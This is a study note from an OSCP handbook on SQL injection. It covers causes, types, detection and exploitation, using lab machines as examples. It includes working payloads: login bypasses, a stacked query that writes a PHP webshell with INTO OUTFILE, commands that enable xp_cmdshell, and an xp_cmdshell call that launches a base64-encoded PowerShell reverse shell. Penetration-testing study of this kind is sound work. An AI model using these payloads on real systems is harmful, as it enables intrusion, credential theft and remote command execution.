---
title: "SQL Injection"
slug: sql-injection
category: notes
handbook: oscp
tags: ["sql-injection"]
draft: false
pubDatetime: 2026-07-18T17:48:53+03:00
modDatetime: 2026-09-09T21:52:45+03:00
description: "SQL injection (SQLi) happens when user input is placed into a database query without being kept separate from the query's code."
---
SQL injection (SQLi) happens when user input is placed into a database query without being kept separate from the query's code. The application intends the input as data, but the database parses part of it as SQL, so it becomes possible to change what the query does: read other rows, dump other tables, log in without a password, and on some setups read and write files or run OS commands.

## Why It Happens

A query built by string concatenation trusts whatever the input contains:

```php
$q = "SELECT * FROM users WHERE name = '" . $_GET['name'] . "'";
```

Input `' OR '1'='1` closes the string and adds a condition that is always true, changing the query's meaning. The real fix is parameterised queries (bound parameters), which keep data out of the code path. Any place that concatenates input into SQL is a candidate, including numeric fields, `ORDER BY`, `LIMIT`, cookies, and headers, not only obvious text boxes.

## Types

SQLi is classified by how the results come back.

### In-band: results in the response

- **Error-based**: a database error message leaks data. Provoke an error that embeds the result of a subquery.
- **UNION-based**: append `UNION SELECT ...` to pull columns from other tables into the page output. It needs the column count and compatible types, found with `ORDER BY n` or `UNION SELECT NULL,NULL,...`.

### Blind: no data in the response, only behaviour

- **Boolean-based**: a true condition and a false condition make the page render differently (a result appears or does not). Data is read one bit at a time by asking yes/no questions, such as `AND SUBSTRING(password,1,1)='a'`.
- **Time-based**: nothing visibly changes, so the query is made to pause on a true condition and the answer is read from the response time, such as `AND IF(<cond>, SLEEP(5), 0)`. Slowest, but works when nothing else leaks.

### Stacked queries: a second statement

Where the database driver allows multiple statements separated by `;`, an entirely new statement runs after the intended one:

```sql
... ; SELECT "<?php system($_GET['cmd'])?>" INTO OUTFILE "/var/www/html/shell.php"
```

Stacked queries are what make file writes and similar side effects possible through an injection. Pebbles used exactly this against ZoneMinder's `limit` parameter.

Whether stacking works is decided by the database driver, not the site's language. PHP's MySQL drivers default to one statement per query, so PHP-plus-MySQL apps usually answer stacked payloads with nothing. ASP.NET's `SqlClient` runs batches by default, so an aspx site is the case to try stacking first, and it pairs with MSSQL far more often than not ([MSSQL: xp_cmdshell through the injection](#mssql-xp-cmdshell-through-the-injection)). Medtech's login form is that pairing end to end.

## Finding It

Send inputs that would change or break SQL syntax and watch for a difference:

- A single quote `'` causing a 500 error or a changed page.
- `' OR '1'='1` versus `' OR '1'='2` rendering differently (boolean signal).
- `1' AND SLEEP(5)-- -` making the response hang for five seconds (time signal).

Test every parameter, across GET, POST, cookies, and headers. Burp Repeater is the manual tool of choice for isolating one parameter and comparing responses side by side. If the endpoint rejects the verb with `405 Method Not Allowed`, switch it with Repeater's **Change request method** rather than assuming the parameter is not reachable; on Hawat the injectable endpoint only answered POST despite its source annotating it as a GET.

An error that echoes the query is worth more than a payload that works, because it hands over the statement's shape. On Cockpit `username='--aasd` returned `near '--aasd'' AND password like '%test%'`, which showed both fields sit inside `LIKE '%...%'` and the username is single-quoted, so the bypass could be written to fit the exact query rather than guessed. `--aasd` broke syntax precisely because `--` is only a MySQL comment when followed by whitespace, so it commented nothing and the parser complained with the fragment attached.

## Exploiting It

Once confirmed, the aim depends on the type:

- Enumerate the schema through `information_schema`: current database, version, tables, columns.
- Dump interesting rows such as credentials, hashes, and tokens.
- Bypass a login form with `' OR 1=1-- -`, or comment out the rest of the clause with `admin'#` to drop the password check while keeping a real username.

Match the comment style to the target. MySQL's `-- ` needs a trailing space, which is easy to lose when a payload is pasted into a URL-encoded body, so `#` is more reliable there since it needs nothing after it. On Cockpit `admin'#` bypassed the login on the same parameter where a `--`-style probe had only produced a syntax error.

For the blind types the same enumeration is done through the boolean or time oracle one character at a time, so it is normally scripted.

A dumped hash can be the credential another exploit for the same application asks for. On QuackerJack the rConfig admin's unsalted MD5 came out of the `users` table through the injection and cracked instantly, and those credentials were what the authenticated command-injection PoC for the same version needed.

## Beyond Data: Files and Commands

When the database account has the `FILE` privilege (common when an app connects as `root`), a MySQL injection is more than data theft:

- `LOAD_FILE()` reads files from disk.
- `SELECT ... INTO OUTFILE` writes files, for example a PHP webshell into a web root.
- A user-defined function turns database access into OS command execution.

That chain, injection to file write to shell to root, is the whole of Pebbles, and the database side of it is documented in [MySQL Privilege Escalation](/collections/oscp/mysql-privilege-escalation).

The write target does not have to be the injected app's own web root. The database serves any app on the host, so `INTO OUTFILE` can drop a shell into a different application's directory. On Hawat the injection lived in a Java app on one port, but the file was written to `/srv/http`, the document root of a separate PHP app on another port (found through an exposed `phpinfo.php`), which then executed it. Cross-reference every writable path against every served port.

### MSSQL: xp_cmdshell through the injection

SQL Server's route from injection to OS commands is `xp_cmdshell`, which runs a command as the SQL Server service account and returns its output as rows. Reaching it through a web app depends on stacked queries, and the .NET SqlClient driver runs multiple statements per batch by default, which makes an ASP.NET login form the classic host. The exception message does the fingerprinting: `System.Data.SqlClient.SqlException` on Medtech's login page named the driver, the database, and a concatenation-built query in one response to a trailing single quote.

Auth bypass payloads failing does not make the form a dead end. A second statement can ride along without rewriting the first into something that logs in:

```sql
medtech'; EXEC xp_cmdshell 'whoami'-- -
```

`xp_cmdshell` has shipped disabled by default since SQL Server 2005, so the first attempt may do nothing at all. When the application's database account is privileged enough, the same injection point turns it on:

```sql
medtech'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -
```

Whether stacking runs at all is answerable without any of this: `medtech'; WAITFOR DELAY '0:0:8'-- -` comes back after eight seconds when a second statement executes and instantly when it does not, independent of `xp_cmdshell` state or payload correctness. On Medtech this probe separated an injection problem from a payload problem.

A login form answers with its failure page whatever the command did, so there is no output channel and every result is read indirectly. Prove execution with a callback (ICMP is enough), then ship the shell. PowerShell's base64 form is the payload to reach for, since the command has to survive single quotes inside SQL and URL encoding in the POST body; generation is the `-enc` recipe in [Reverse Shells Windows payloads](/collections/oscp/reverse-shells#windows-payloads):

```sql
medtech'; EXEC xp_cmdshell 'powershell -e <base64>'-- -
```

Details that decide whether this fires:

- Keep `__VIEWSTATE` and `__EVENTVALIDATION` untouched in the POST body. WebForms validates them, and tampered state breaks the request before the query runs. Textbox values are not event-validated, so the username field carries the payload.
- Type the statement into the body as plain SQL with literal spaces and single quotes. A walkthrough's URL-encoded payload pasted as-is landed a literal `+` inside the batch and answered `Incorrect syntax near '+'`, followed by the xp_cmdshell string being reported unclosed (Medtech). Encode only what the body grammar or the payload demands: `%27` for quotes that must survive into SQL, and `%2B`/`%3D` for `+`/`=` characters inside a `powershell -e` base64, since a `+` decoded as a space corrupts the script with no output channel to report it.
- MSSQL's `--` needs no trailing space, unlike MySQL's.
- If nothing fires after the enable sequence, the application account is under-privileged and `sp_configure` failed silently. The injection then drops back to data extraction.

## Tooling and the Exam

`sqlmap` automates detection and exploitation, but it is restricted to a single machine in the OSCP exam and easy to trip over, so most exam SQLi is done by hand in Burp. Knowing the manual boolean and time payloads matters, because the automated tool is not always available.
